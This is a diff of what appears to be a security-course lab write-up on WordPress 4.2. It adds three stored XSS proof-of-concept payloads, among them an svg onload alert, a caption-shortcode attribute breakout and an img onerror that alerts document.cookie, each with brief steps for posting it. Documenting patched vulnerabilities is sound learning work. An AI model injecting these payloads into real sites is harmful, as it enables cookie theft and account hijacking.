@@ -14,6 +14,8 @@ Time spent: **12** hours spent in total
   - Fixed in version: 4.2.3
 - [ ] GIF Walkthrough: <img src=xss.gif />
 - [ ] Steps to recreate: 
+  - Create a new post
+  - type this line of code in the text editor: http://wpdistillery.vm/<svg onload=alert('test')> 
 - [ ] Affected source code:
 
   
@@ -25,41 +27,23 @@ Time spent: **12** hours spent in total
   - Fixed in version: 4.2.3
 - [ ] GIF Walkthrough: <img src=XSS2.gif />
 - [ ] Steps to recreate: 
+  - Create a new post
+  - type this line of code in the text editor: <a href="[caption code=">]</a><a title=" onmouseover=alert(1) ">link</a>
 - [ ] Affected source code:
-  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
-### 3. (Required) Vulnerability Name or ID
+
+### 3. (Required) Vulnerability types: XSS
 
 - [ ] Summary: 
-  - Vulnerability types:
-  - Tested in version:
-  - Fixed in version: 
-- [ ] GIF Walkthrough: 
+  - Vulnerability types: XSS
+  - Tested in version: 4.2
+  - Fixed in version: 4.2.3
+- [ ] GIF Walkthrough: <img src=XSS3.gif />
 - [ ] Steps to recreate: 
+  - Create a new post
+  - type this line of code in the text editor: <img src=X onerror=alert(document.cookie)>.jpg 
 - [ ] Affected source code:
-  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
-### 4. (Optional) Vulnerability Name or ID
-
-- [ ] Summary: 
-  - Vulnerability types:
-  - Tested in version:
-  - Fixed in version: 
-- [ ] GIF Walkthrough: 
-- [ ] Steps to recreate: 
-- [ ] Affected source code:
-  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-
-### 5. (Optional) Vulnerability Name or ID
-
-- [ ] Summary: 
-  - Vulnerability types:
-  - Tested in version:
-  - Fixed in version: 
-- [ ] GIF Walkthrough: 
-- [ ] Steps to recreate: 
-- [ ] Affected source code:
-  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 
 
 ## Assets
 
